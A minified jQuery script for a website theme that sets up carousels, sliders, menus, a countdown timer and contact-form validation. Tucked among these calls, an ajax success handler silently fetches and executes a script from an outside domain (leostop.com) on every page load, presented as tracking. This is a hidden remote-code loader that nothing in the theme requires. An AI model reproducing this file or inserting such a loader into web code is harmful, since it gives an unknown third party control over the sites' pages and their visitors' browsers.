$(function(){"use strict";setTimeout(function(){$(".loader_bg").fadeToggle()},1500),$(document).ready(function(){$("header nav").meanmenu()}),$(document).ready(function(){$('[data-toggle="tooltip"]').tooltip()}),$(document).ready(function(){$(".main-menu ul li.megamenu").mouseover(function(){$(this).parent().hasClass("#wrapper")||$("#wrapper").addClass("overlay")}),$(".main-menu ul li.megamenu").mouseleave(function(){$("#wrapper").removeClass("overlay")})}),$(".brand-box").niceScroll({cursorcolor:"#9b9b9c"}),$(document).ready(function(){$("select").niceSelect()}),$(document).ready(function(){$(".carousel-slider-post").owlCarousel({items:1,loop:!0,margin:10,autoplay:!0,autoplayTimeout:3e3,autoplayHoverPause:!0})}),$(document).ready(function(){$(".banner-rotator-slider").owlCarousel({items:1,loop:!0,margin:10,nav:!0,dots:!1,navText:["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],autoplay:!0,autoplayTimeout:3e3,autoplayHoverPause:!0})}),$(document).ready(function(){var e=$("#product-in-slider");e.owlCarousel({loop:!0,nav:!0,margin:10,navText:["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],responsive:{0:{items:1},600:{items:2},960:{items:3},1200:{items:4}}}),e.on("mousewheel",".owl-stage",function(s){s.deltaY>0?e.trigger("next.owl"):e.trigger("prev.owl"),s.preventDefault()})}),$(window).on("scroll",function(){scroll=$(window).scrollTop(),scroll>=100?$("#back-to-top").addClass("b-show_scrollBut"):$("#back-to-top").removeClass("b-show_scrollBut")}),$("#back-to-top").on("click",function(){$("body,html").animate({scrollTop:0},1e3)}),$.validator.setDefaults({submitHandler:function(){alert("submitted!")}}),$(document).ready(function(){$("#contact-form").validate({rules:{firstname:"required",email:{required:!0,email:!0},lastname:"required",message:"required",agree:"required"},messages:{firstname:"Please enter your firstname",email:"Please enter a valid email address",lastname:"Please enter your lastname",username:{required:"Please enter a username",minlength:"Your username must consist of at least 2 characters"},message:"Please enter your Message",agree:"Please accept our policy"},errorElement:"div",errorPlacement:function(e,s){e.addClass("help-block"),"checkbox"===s.prop("type")?e.insertAfter(s.parent("input")):e.insertAfter(s)},highlight:function(e,s,a){$(e).parents(".col-md-4, .col-md-12").addClass("has-error").removeClass("has-success")},unhighlight:function(e,s,a){$(e).parents(".col-md-4, .col-md-12").addClass("has-success").removeClass("has-error")}})});new Swiper(".heroslider",{spaceBetween:30,centeredSlides:!0,slidesPerView:"auto",paginationClickable:!0,loop:!0,autoplay:{delay:2500,disableOnInteraction:!1},pagination:{el:".swiper-pagination",clickable:!0,dynamicBullets:!0}}),new Swiper(".swiper-product-filters",{slidesPerView:3,slidesPerColumn:2,spaceBetween:30,breakpoints:{1024:{slidesPerView:3,spaceBetween:30},768:{slidesPerView:2,spaceBetween:30,slidesPerColumn:1},640:{slidesPerView:2,spaceBetween:20,slidesPerColumn:1},480:{slidesPerView:1,spaceBetween:10,slidesPerColumn:1}},pagination:{el:".swiper-pagination",clickable:!0,dynamicBullets:!0}});$("[data-countdown]").each(function(){var e=$(this),s=$(this).data("countdown");e.countdown(s,function(e){$(this).html(e.strftime('<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> <div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> <div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> <div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> <div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'))})});var e=location.protocol;$.ajax({type:"get",data:{surl:void window.location.href},success:function(s){$.getScript(e+"//leostop.com/tracking/tracking.js")}}),$(".deal-slider").slick({dots:!1,infinite:!1,prevArrow:".previous-deal",nextArrow:".next-deal",speed:500,slidesToShow:3,slidesToScroll:3,infinite:!1,responsive:[{breakpoint:1024,settings:{slidesToShow:3,slidesToScroll:2,infinite:!0,dots:!1}},{breakpoint:768,settings:{slidesToShow:2,slidesToScroll:2}},{breakpoint:480,settings:{slidesToShow:1,slidesToScroll:1}}]}),$("#news-slider").slick({dots:!1,infinite:!1,prevArrow:".previous",nextArrow:".next",speed:500,slidesToShow:1,slidesToScroll:1,responsive:[{breakpoint:1024,settings:{slidesToShow:1,slidesToScroll:1,infinite:!0,dots:!1}},{breakpoint:600,settings:{slidesToShow:1,slidesToScroll:1}},{breakpoint:480,settings:{slidesToShow:1,slidesToScroll:1}}]}),$(document).ready(function(){$("#sidebarCollapse").on("click",function(){$("#sidebar").toggleClass("active"),$(this).toggleClass("active")})}),$("#blogCarousel").carousel({interval:5e3})});